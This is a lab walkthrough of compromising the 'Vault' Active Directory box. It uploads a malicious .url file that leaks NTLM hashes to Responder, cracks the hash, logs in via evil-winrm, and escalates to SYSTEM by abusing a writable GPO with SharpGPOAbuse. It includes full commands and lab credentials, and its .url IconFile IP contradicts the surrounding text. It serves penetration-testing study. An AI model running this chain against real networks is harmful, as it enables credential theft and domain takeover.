AD-Lab / Active Directory / PG Vault

<img width="594" height="224" alt="image" src="https://github.com/user-attachments/assets/1ab863e8-8d90-4cef-ab19-8fa99d0a255c" />

scope - 192.168.64.172


first phase - recon

```bash
sudo nmap -sC -sV vault -sT -vvvv -p- -Pn -T5 --min-rate=5000
```
```bash
sudo nmap -sC -sV vault -sT -vvvv -p- -Pn -T5 --min-rate=5000

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-05-23 10:59:00Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-23T10:59:55+00:00
| ssl-cert: Subject: commonName=DC.vault.offsec
| Issuer: commonName=DC.vault.offsec
|_ssl-date: 2025-05-23T11:00:35+00:00; +1s from scanner time.
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         syn-ack Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack Microsoft Windows RPC
49708/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```



Based on the output, we can assume that we are in an Active Directory box, because there is Kerberos on port 88 and LDAP on port 389. After that initial scan I always run nmap with -p- flag to make sure that I’ve discovered all the ports. In that case, it only shows the presence of WinRM.
So what do we want to enumerate?
- RPC (as always on windows box)
- SMB (as always on windows box)
- LDAP (sometimes we can dump some interesting info)
- DNS (last resort)
RPC — null auth

I really like enumrating RPC, because it often gives us valueable informations like usernames, groups and info about server. To do that, we use a tool called rpcclient with flags -U (to specify the user, in our case, for null authentication we leave it empty) and -N (to skip the password prompt) followed by ip address.

```bash
rpcclient -U "" -N 192.168.64.172
```

<img width="684" height="73" alt="image" src="https://github.com/user-attachments/assets/989d039c-1967-48cc-bdc5-a7c5f98cb08c" />

Unfortunately, We don’t have access to it. So far we don’t have any other candidates to check, so we move on.
SMB — null auth

SMB is also really pleasant to enumerate. We can do it with a tool called smbclient with flags -N (to do null authentication) and -L (to list all shares) followed by ip.

```bash
smbclient -N -L //192.168.64.172
```

<img width="977" height="308" alt="image" src="https://github.com/user-attachments/assets/0a361dac-801f-4ebe-bd22-361dd10c2d9f" />

We’ve discovered a share called DocumentsShare, which seems interesting. let’s poke around in it for a while, starting by logging into this share:

```bash
smbclient -N //192.168.64.172/DocumentsShare
```

<img width="841" height="203" alt="image" src="https://github.com/user-attachments/assets/409d3601-d2ae-4f10-af33-eee63de1165d" />

We successfully logged in, but there are no files inside. The next thing we gonna check is if we can upload some files to it. To do this, I’ve created a sample file called test.txt. Let’s give a try to upload it:


```bash
echo "something" > test.txt
```
<img width="894" height="265" alt="image" src="https://github.com/user-attachments/assets/a032d1cb-4dd0-43bd-89ea-53b07c0e8cfa" />

It worked! Bear in mind that we’re on Windows, so we can abuse NTLM authentication. Before the actual attack, we need a bit of theory on how NTLM auth works (more precisely, Net-NTLMv2):
1. The user tries to connect to a service, sending a message like: “Hey, I’d like to access your service.”
2. The service responds with something like: “Sure, but first prove you are who you say you are. Encrypt this value using your NTLM hash”
3. The user then encrypts the value and sends it back..
4. Based on that response, the service decides whether access is granted or not.
Now, a question might come up, how can we force a user to authenticate to us? The answer is simple, NTLM auth is default authentication method, so we just need to set up a fake service. Basically, here’s what we’re gonna do:
1. Create a malicious file that tries to connect back to us (to trigger NTLM authentication).
2. Set up a fake service. In our case we’ll set up SMB server.
3. Upload that malicious file and hope someone (a bot) clicks on it.”
4. gather the NTLM hash of the user who clicked on it.

## Exploitation

### URI File Attack

As this is a Windows host, we can use the SMB share access to upload a file that the target system will interpret as a Windows shortcut. In this file, we can specify an icon that points to our Kali host. This should allow us to capture the user's NTLM hash when it is accessed.


We'll create a file named **@hax.url** with the following contents.

```bash
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\192.168.64.172\%USERNAME%.icon
IconIndex=1
```
<img width="504" height="163" alt="image" src="https://github.com/user-attachments/assets/d6e4a96d-e3f3-448f-b49b-adf5b63b28d7" />

When a user accesses this file, it will attempt to load the icon. This will cause a request to our Kali host for a file named with the user account's username. This request should also contain the NTLM hash of this account.

Before uploading the file to the SMB share, let's start `responder` to listen for the request.

```bash
sudo responder -I eth0 -v
```
<img width="765" height="159" alt="image" src="https://github.com/user-attachments/assets/79244d31-808b-4b67-b041-4efaa7648240" />


After a little while, `responder` captures a hash.

<img width="1038" height="188" alt="image" src="https://github.com/user-attachments/assets/a4b82b58-9f97-48a1-95e2-6a8c52e307c0" />

now crach that hash using john

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="1090" height="243" alt="image" src="https://github.com/user-attachments/assets/60016357-c464-4173-9f9b-9515f0fc8597" />


We were able to recover the password for the user `anirudh`: `SecureHM`. Let's use this account to attempt to log in to the target using `evil-winrm`.

```bash
evil-winrm -i 192.168.64.172 -u anirudh -p "SecureHM"
```

<img width="1153" height="286" alt="image" src="https://github.com/user-attachments/assets/6f1aa7bb-be13-4a6b-93f1-3ff708ed7f89" />

We now have shell access on the target system as `anirudh`.

## Escalation

### Group Policy Object Enumeration

Let's start off by checking if our user has access to modify any Group Policy Objects. We can use helper PowerShell modules to assist us with finding the information we need. Let's copy **PowerView.ps1** to our working directory on our Kali host.

```bash
 cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
```

Next, we'll re-connect to the target using `evil-winrm` with the `-s` argument to give us access to PowerShell scripts in our home directory.

<img width="1259" height="263" alt="image" src="https://github.com/user-attachments/assets/788f2070-b407-46e6-b4d6-26967d49a891" />

We'll then simply call the **PowerView.ps1** script to load it in our PowerShell session.

```
*Evil-WinRM* PS C:\Users\anirudh\Documents> PowerView.ps1
```

We can now run `Get-NetGPO` to list GPOs.

```bash
*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-NetGPO
```

<img width="1361" height="606" alt="image" src="https://github.com/user-attachments/assets/43c4bbd2-91ef-4deb-bb20-d4d98d0af798" />


We can check what permissions we have on a specific GPO by passing its GUID (labeled "name") to the cmdlet `Get-GPPermission`. Let's check our permissions on the **Default Group Policy**.

```bash
*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh
```
<img width="1236" height="175" alt="image" src="https://github.com/user-attachments/assets/a0ff6dce-5732-4ede-93ed-8f33e85d3dde" />



The entry labeled `Permission` shows that we have the ability to edit, delete, and modify this policy. We can take advantage of this misconfiguration by using a tool named `SharpGPOAbuse`.

### GPO Abuse via SharpGPOAbuse

Let's download a copy of the pre-complied executable from https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe to our Kali host.

```
┌──(kali㉿kali)-[~]
└─$ wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
--2021-11-19 15:27:15--  https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
...

2021-11-19 15:27:16 (3.70 MB/s) - ‘SharpGPOAbuse.exe’ saved [70656/70656]
```

Back in our `evil-winrm` shell, we'll upload the executable using the `upload` command.

```bash
upload /home/kali/SharpGPOAbuse.exe
```

<img width="1027" height="187" alt="image" src="https://github.com/user-attachments/assets/62c87b85-218f-448c-8d05-00cb605b155e" />


We can now execute **SharpGPOAbuse.exe** specifying that we want to add our user account to the local Administrators group, passing our username, and passing the group policy we have write access to.

```bash
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
```

<img width="1242" height="302" alt="image" src="https://github.com/user-attachments/assets/e1ed40b3-b8b9-45a1-95d8-f690973379b7" />

With that done, we'll need to update the local Group Policy.

```
gpupdate /force
```
<img width="702" height="174" alt="image" src="https://github.com/user-attachments/assets/764f6f49-a26a-4619-ba45-590914b0f185" />


We can verify that this worked by checking the members of the local Administrators group.

```bash
net localgroup Administrators
```
<img width="1026" height="226" alt="image" src="https://github.com/user-attachments/assets/f8f9774b-e9aa-402f-9d23-6b7808a51205" />


Our account, `anirudh`, is listed as a member of the Administrators group. We can use this access to gain a system shell. Back on our Kali host, let's use `psexec.py` from _Impacket_ to help us.

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py vault.offsec/anirudh:SecureHM@192.168.64.172
```

<img width="1120" height="334" alt="image" src="https://github.com/user-attachments/assets/680772f8-37f9-4ebd-8fdc-ec037f90ee37" />


We now have SYSTEM access on the target! 

we’re gonna use rdesktop too:
```bash
rdesktop 192.168.64.172
```
<img width="1919" height="907" alt="image" src="https://github.com/user-attachments/assets/48228d77-f383-4eca-8674-7d88f2a53c25" />
























